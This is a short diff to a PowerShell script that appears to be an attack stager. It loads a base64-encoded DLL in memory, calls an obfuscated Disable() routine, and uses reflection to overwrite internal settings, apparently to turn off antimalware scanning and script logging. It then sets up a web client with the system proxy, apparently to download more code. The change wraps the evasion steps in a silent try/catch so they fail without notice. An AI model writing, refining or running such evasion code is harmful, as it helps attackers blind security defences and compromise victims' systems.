@@ -67,11 +67,13 @@ if(-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
     [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
 }
 
-IEX "[$string1]::Disable()"
+try {
+    IEX "[$string1]::Disable()"
 
-$settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
-$settings[$string5] = @{}
-$settings[$string5].Add($string6, "0")
+    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
+    $settings[$string5] = @{}
+    $settings[$string5].Add($string6, "0")
+} catch {}
 
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
